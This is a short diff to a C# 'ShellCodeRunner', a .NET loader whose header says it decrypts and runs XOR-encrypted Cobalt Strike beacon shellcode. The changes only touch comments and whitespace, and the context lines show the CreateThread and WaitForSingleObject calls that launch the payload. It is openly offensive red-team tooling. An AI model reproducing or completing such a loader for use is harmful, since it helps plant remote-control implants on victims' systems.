@@ -1,6 +1,7 @@
 ﻿/*
- * ShellCodeRunner
- * A .NET ShellCode runner wiht built in XOR DECRYPTOR, intended for running XOR encrypted  
+ * ShellCodeRunner: 
+ * Executes the shellcode injection technique
+ * A .NET ShellCode runner with built in XOR DECRYPTOR, intended for running XOR encrypted  
  * Cobalt strike beacon payloads, but can be used for any XOR encrypted payload.
  * 
  * By Antonio Piazza
@@ -83,8 +84,10 @@ namespace ShellCodeRunner
             // Prepare variables for CreateThread
             IntPtr threadId = IntPtr.Zero;
             SECURITY_ATTRIBUTES attrs = new SECURITY_ATTRIBUTES();
+
             // Create the thread
             IntPtr hThread = CreateThread(attrs, 0, segment, IntPtr.Zero, CreationFlags.IMMEDIATE, out threadId);
+
             // Wait for its execution to finish, which is until beacon calls exit.
             WaitForSingleObject(hThread, 0xFFFFFFFF);
         }
